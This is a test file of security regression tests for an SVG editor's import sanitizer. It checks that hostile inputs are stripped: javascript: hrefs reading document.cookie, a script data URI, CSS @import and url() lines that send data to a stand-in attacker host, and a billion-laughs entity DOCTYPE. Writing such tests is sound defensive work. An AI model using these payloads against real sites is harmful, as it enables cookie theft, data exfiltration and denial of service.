/**
 * Security regression tests for the SVG import sanitizer.
 *
 * Each test demonstrates a concrete injection/exfiltration vector that an
 * untrusted opened/pasted/source-edited SVG could carry through `sanitizeSvg`
 * (or `dropXMLInternalSubset`). These are the tests that should have caught the
 * sanitizer-hardening findings (#1, #2, #3, #38, #39, #41, #42).
 */
import { describe, it, expect, beforeEach, afterEach } from 'vitest'
import { NS } from '../../packages/svgcanvas/core/namespaces.js'
import * as sanitize from '../../packages/svgcanvas/core/sanitize.js'
import * as utilities from '../../packages/svgcanvas/core/utilities.js'

describe('sanitizeSvg — SVG <a> href scheme hardening (#1, #39)', () => {
  let container: HTMLDivElement
  let svg: SVGSVGElement
  let originalWarn: typeof console.warn
  const el = (name: string) => document.createElementNS(NS.SVG, name)

  beforeEach(() => {
    originalWarn = console.warn
    console.warn = () => {}
    container = document.createElement('div')
    svg = el('svg') as SVGSVGElement
    container.append(svg)
    document.body.append(container)
    utilities.init({ getSvgRoot: () => svg } as never)
  })
  afterEach(() => {
    container.remove()
    console.warn = originalWarn
  })

  it('strips a javascript: href on an SVG <a> (modern href)', () => {
    const a = el('a')
    a.setAttribute('href', 'javascript:alert(document.cookie)')
    a.append(el('rect'))
    svg.append(a)

    sanitize.sanitizeSvg(a)

    expect(a.hasAttribute('href')).toBe(false)
    expect(a.getAttributeNS(NS.XLINK, 'href')).toBeNull()
  })

  it('strips a javascript: href smuggled via legacy xlink:href on an SVG <a> (#39 mirror)', () => {
    const a = el('a')
    a.setAttributeNS(NS.XLINK, 'xlink:href', 'javascript:alert(1)')
    a.append(el('rect'))
    svg.append(a)

    sanitize.sanitizeSvg(a)

    expect(a.getAttribute('href') ?? '').not.toMatch(/javascript:/i)
    expect(a.hasAttribute('href')).toBe(false)
    expect(a.getAttributeNS(NS.XLINK, 'href')).toBeNull()
  })

  it('keeps a safe http(s) href and a fragment href on an SVG <a>', () => {
    const a = el('a')
    a.setAttribute('href', 'https://example.com/page')
    svg.append(a)
    sanitize.sanitizeSvg(a)
    expect(a.getAttribute('href')).toBe('https://example.com/page')

    const a2 = el('a')
    a2.setAttribute('href', '#frag')
    svg.append(a2)
    sanitize.sanitizeSvg(a2)
    expect(a2.getAttribute('href')).toBe('#frag')
  })
})

describe('sanitizeSvg — <image> href scheme hardening (#2)', () => {
  let container: HTMLDivElement
  let svg: SVGSVGElement
  let originalWarn: typeof console.warn
  const el = (name: string) => document.createElementNS(NS.SVG, name)

  beforeEach(() => {
    originalWarn = console.warn
    console.warn = () => {}
    container = document.createElement('div')
    svg = el('svg') as SVGSVGElement
    container.append(svg)
    document.body.append(container)
    utilities.init({ getSvgRoot: () => svg } as never)
  })
  afterEach(() => {
    container.remove()
    console.warn = originalWarn
  })

  it('strips a non-image data: URI on <image>', () => {
    const img = el('image')
    img.setAttribute('href', 'data:text/html,<script>alert(1)</script>')
    svg.append(img)

    sanitize.sanitizeSvg(img)

    expect(img.hasAttribute('href')).toBe(false)
    expect(img.getAttributeNS(NS.XLINK, 'href')).toBeNull()
  })

  it('keeps http(s), data:image/*, and fragment hrefs on <image>', () => {
    const cases = [
      'https://example.com/x.png',
      'http://example.com/test.png',
      'data:image/png;base64,iVBORw0KGgo=',
      '#localref'
    ]
    for (const href of cases) {
      const img = el('image')
      img.setAttribute('href', href)
      svg.append(img)
      sanitize.sanitizeSvg(img)
      expect(img.getAttribute('href')).toBe(href)
    }
  })
})

describe('sanitizeSvg — inline <style> CSS hardening (#3)', () => {
  let container: HTMLDivElement
  let svg: SVGSVGElement
  let originalWarn: typeof console.warn
  const el = (name: string) => document.createElementNS(NS.SVG, name)

  beforeEach(() => {
    originalWarn = console.warn
    console.warn = () => {}
    container = document.createElement('div')
    svg = el('svg') as SVGSVGElement
    container.append(svg)
    document.body.append(container)
    utilities.init({ getSvgRoot: () => svg } as never)
  })
  afterEach(() => {
    container.remove()
    console.warn = originalWarn
  })

  it('neutralizes @import / url() exfiltration in a <style> body', () => {
    const style = el('style')
    style.textContent = '@import url(https://attacker.example/leak?c=1); .x{fill:red}'
    svg.append(style)

    sanitize.sanitizeSvg(style)

    const css = style.textContent ?? ''
    expect(css).not.toMatch(/@import/i)
    expect(css).not.toMatch(/url\s*\(/i)
  })

  it('keeps a benign <style> rule', () => {
    const style = el('style')
    style.textContent = '.a { fill: #000; stroke: blue }'
    svg.append(style)

    sanitize.sanitizeSvg(style)

    expect(style.textContent).toContain('fill')
  })
})

describe('sanitizeSvg — data-*/se: attribute validation (#41)', () => {
  let container: HTMLDivElement
  let svg: SVGSVGElement
  let originalWarn: typeof console.warn
  const el = (name: string) => document.createElementNS(NS.SVG, name)

  beforeEach(() => {
    originalWarn = console.warn
    console.warn = () => {}
    container = document.createElement('div')
    svg = el('svg') as SVGSVGElement
    container.append(svg)
    document.body.append(container)
    utilities.init({ getSvgRoot: () => svg } as never)
  })
  afterEach(() => {
    container.remove()
    console.warn = originalWarn
  })

  it('drops an oversized data-* value (DoS smuggling channel)', () => {
    const rect = el('rect')
    rect.setAttribute('data-payload', 'x'.repeat(5000))
    svg.append(rect)

    sanitize.sanitizeSvg(rect)

    expect(rect.hasAttribute('data-payload')).toBe(false)
  })

  it('keeps a normal data-* attribute', () => {
    const rect = el('rect')
    rect.setAttribute('data-note', 'safe')
    svg.append(rect)

    sanitize.sanitizeSvg(rect)

    expect(rect.getAttribute('data-note')).toBe('safe')
  })
})

describe('sanitizeSvg — inline style url()/expression() filtering (#42)', () => {
  let container: HTMLDivElement
  let svg: SVGSVGElement
  let originalWarn: typeof console.warn
  const el = (name: string) => document.createElementNS(NS.SVG, name)

  beforeEach(() => {
    originalWarn = console.warn
    console.warn = () => {}
    container = document.createElement('div')
    svg = el('svg') as SVGSVGElement
    container.append(svg)
    document.body.append(container)
    utilities.init({ getSvgRoot: () => svg } as never)
  })
  afterEach(() => {
    container.remove()
    console.warn = originalWarn
  })

  it('does not promote a style declaration whose value contains url()', () => {
    const text = el('text')
    text.setAttribute('style', 'font-family:url(https://attacker.example/x)')
    svg.append(text)

    sanitize.sanitizeSvg(text)

    expect(text.getAttribute('font-family') ?? '').not.toMatch(/url\s*\(/i)
  })

  it('still promotes a safe style declaration', () => {
    const text = el('text')
    text.setAttribute('style', 'font-family:sans-serif')
    svg.append(text)

    sanitize.sanitizeSvg(text)

    expect(text.getAttribute('font-family')).toBe('sans-serif')
  })
})

describe('dropXMLInternalSubset — billion-laughs guard (#38)', () => {
  it('removes ENTITY declarations from a standard DOCTYPE internal subset', () => {
    const input = '<!DOCTYPE svg [ <!ENTITY lol "lol"> <!ENTITY lol2 "&lol;&lol;"> ]>\n<svg/>'
    const out = utilities.dropXMLInternalSubset(input)
    expect(out).not.toMatch(/<!ENTITY/i)
    expect(out).toContain('<svg/>')
  })

  it('leaves a DOCTYPE without an internal subset untouched', () => {
    const input = '<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "x.dtd">\n<svg/>'
    expect(utilities.dropXMLInternalSubset(input)).toBe(input)
  })
})
